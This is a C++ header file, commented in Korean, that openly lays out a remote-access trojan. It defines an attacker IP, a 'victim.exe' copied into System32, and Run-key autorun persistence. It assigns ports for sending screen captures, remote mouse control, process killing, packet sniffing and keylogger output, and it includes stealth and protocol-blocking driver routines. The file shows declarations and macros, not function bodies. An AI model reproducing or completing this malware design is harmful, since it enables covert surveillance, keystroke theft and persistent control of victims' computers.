/////////////////////헤더정리///////////////////////////	
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include<iostream>
#include<string>
#include<WinSock2.h>
#include<Windows.h>
#include<vector>
#include<tchar.h>
#include<mswsock.h>
#include<atlimage.h>
#include<conio.h>
#include<locale.h>
#include<pcap/pcap.h>
#include<malloc.h>
#include<commctrl.h>
#include<TlHelp32.h>
///////////////lib정리 및 네임스페이스//////////					
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"wpcap.lib")
using namespace std;
//////////////매크로 정리//////////////////////	

#define ATTACKER_IP						"1.1.1.8"				//공격자 IP
//#define ATTACKER_IP					"192.168.0.193"
#define IMAGE_PATH					L"c:\\test.jpeg"		//이미지 저장 경로
#define ADMIN_AUTORUN				L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"		//어드민 권한 오토런 레지스터
#define USER_AUTORUN				L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"		//유저 권한 오토런 레지스터
#define CURRENT_FILE_PATH_SYSTEM32	L"C:\\Windows\\System32\\victim.exe"		//system파일 경로
#define CURRENT_FILE_PATH_SYSTEM	L"C:\\Windows\\System\\victim.exe"			//system파일
#define IMAGE_TRANS_PORT			7000					//이미지 전송 포트
#define MOUSE_MOVE_PORT				7001					//마우스 이동 포트
#define MOUSE_CLICK_PORT			7002					//마우스 클릭 포트
#define PROCESS_VIEW_KILL			7003					//프로세스 관련 포트
#define PACKET_VIEW					7004					//스니핑 포트
#define SNIFFING_DEVICE_VIEW		7005					//처음 디바이스 전송
#define KEYLOGGER_TRANS				7006					//전송
#define CONNECTING_LIST				7007					//컨넥팅 가능한 아이피 출력하게 도와줌
#define SIGNAL						7008					//시그날
#define DRIVER_SIGNAL				7009



#define FTP_CONNECT_BLOCK_START				1
#define FTP_DATA_BLOCK_START				2
#define HTTP_BLOCK_START					3
#define HTTPS_BLOCK_START					4
#define IMAP_BLOCK_START					5
#define NETBIOS_BLOCK_START					6
#define REMOTETERMINAL_BLOCK_START			7
#define SNMP_BLOCK_START					8
#define SSH_BLOCK_START						9
#define TCP_ALL_BLOCK_START					10
#define UDP_ALL_BLOCK_START					11


#define FTP_CONNECT_BLOCK_STOP				101
#define FTP_DATA_BLOCK_STOP					102
#define HTTP_BLOCK_STOP						103
#define HTTPS_BLOCK_STOP					104
#define IMAP_BLOCK_STOP						105
#define NETBIOS_BLOCK_STOP					106
#define REMOTETERMINAL_BLOCK_STOP			107
#define SNMP_BLOCK_STOP						108
#define SSH_BLOCK_STOP						109
#define TCP_ALL_BLOCK_STOP					110
#define UDP_ALL_BLOCK_STOP					111


#define FTP_CONNECT_SYS				L"C:\\Windows\\ftpconnect_block.sys"
#define FTP_DATA_SYS				L"C:\\Windows\\ftpdata_block.sys"
#define HTTP_SYS					L"C:\\Windows\\http_block.sys"
#define HTTPS_SYS					L"C:\\Windows\\https_block.sys"
#define IMAP_SYS					L"C:\\Windows\\imap_block.sys"
#define NETBIOS_SYS					L"C:\\Windows\\netbios_block.sys"
#define REMOTETERMINAL_SYS			L"C:\\Windows\\remoteterminal_block.sys"
#define SNMP_SYS					L"C:\\Windows\\snmp_block.sys"
#define SSH_SYS						L"C:\\Windows\\ssh_block.sys"
#define TCP_ALL_SYS					L"C:\\Windows\\tcp_all_block.sys"
#define UDP_ALL_SYS					L"C:\\Windows\\udp_all_block.sys"



//////////////////구조체 정리//////////////////


typedef struct mouse
{

	POINT xy;
	short left_click_check;
	short right_click_check;
	int flag;
}MOUSE_INFO, * LPMOUSE_INFO;
typedef struct ether_addr
{

	unsigned char e_host[6];

}ETHER_ADDR;


typedef struct ethernet_header
{

	ETHER_ADDR src;

	ETHER_ADDR dst;

	unsigned short type;

}ETHERNET_HEADER;


//ip_header 
typedef struct ip_header

{



	unsigned char header_len : 4;

	unsigned char ver : 4;

	unsigned char tos;

	unsigned short total_len;

	unsigned short id;

	unsigned char frag_offset : 5;

	unsigned char mf : 1;

	unsigned char df : 1;

	unsigned char rz : 1;

	unsigned char frag_offset1;

	unsigned char ttl;

	unsigned char protocol;

	//1=ICMP, 2=IGMP, 6=TCP, 8= EGP, 17=UDP, 89=OSPF 등등.....

	unsigned char cksum;

	IN_ADDR src_ip;

	IN_ADDR dst_ip;

}IP_HEADER;

typedef struct tcp_header
{

	unsigned short src_port;

	unsigned short dst_port;

	unsigned int seq;

	unsigned int ack;

	unsigned char data_offset;

	unsigned char ns : 1;

	unsigned char reserved : 3;

	unsigned char flag_fin : 1;

	unsigned char flag_syn : 1;

	unsigned char flag_rst : 1;

	unsigned char flag_psh : 1;

	unsigned char flag_ack : 1;

	unsigned char flag_urg : 1;

	unsigned char flag_ece : 1;

	unsigned char flag_cwr : 1;

	unsigned short window;

	unsigned short cksum;

	unsigned short up;

}TCP_HEADER;



void stealth(bool);
////////////////////////////////////

					////////////////마우스/////////////////////						
void Mouse_Move(MOUSE_INFO mouse_process);														//recv udp에서 돌림
void Mouse_Click(MOUSE_INFO mouse_process);														//recv tcp에서 돌림
void MouseRecvTcpSocket();					//마우스 클릭 받기
void RecvfromUdpSocket();						//마우스 움직임 받기


////////////////이미지///////////////////////

PVOID GetSockExtAPI(SOCKET sock, GUID guidFn);													//함수 포인터
void capture();																					//이미지 캡쳐 저장
void image_trans();																				//이미지 전송



VOID SystemError(const TCHAR* msg);																//시스템에러
VOID SocketError(const TCHAR* msg);																//소켓에러



SOCKET GetTcpSocket(SOCKET& ssock, short port);													//TCP 소켓셋팅
/**/
/////////////////////////////////////////////////////////////////////////////////////

int PrintEtherNetHeader(unsigned const char* data);
int PrintIpHeader(unsigned const char* data);
int PrintTcpHeader(unsigned const char* data);
void PrintData(unsigned const char* data);
int Sniffing();	

/////////////////////프로세스 //////////////////////////////////////////////////////////


void ProcessList();

/////////////////////////////////////////////////////////////////////////////
void SetAutoRun();																				//오토런


void CurrentProgramCopy();																			//프로그램 복사

void Suicide();															//똑같은 프로세스 이름 죽이기

int keylogger();



void startfunction();
void ConnectingList();



void sig();						


void Makesys();
void DriverService();

//void Mouse_Move(MOUSE_INFO mouse_process);															//recv udp에서 돌림
//void Mouse_Click(MOUSE_INFO mouse_process);															//recv tcp에서 돌림
//void Mouse_Recv_Tcp_Socket(SOCKET ssock, SOCKET csock, LPSOCKADDR_IN saddr);						//마우스 클릭 받기
//void Recvfrom_Udp_Socket(SOCKET ssock, SOCKET csock, SOCKADDR_IN saddr, SOCKADDR_IN caddr);			//마우스 움직임 받기

//PVOID GetSockExtAPI(SOCKET sock, GUID guidFn);														//함수 포인터
//void capture();																						//이미지 캡쳐
//void image_trans();																					//이미지 전송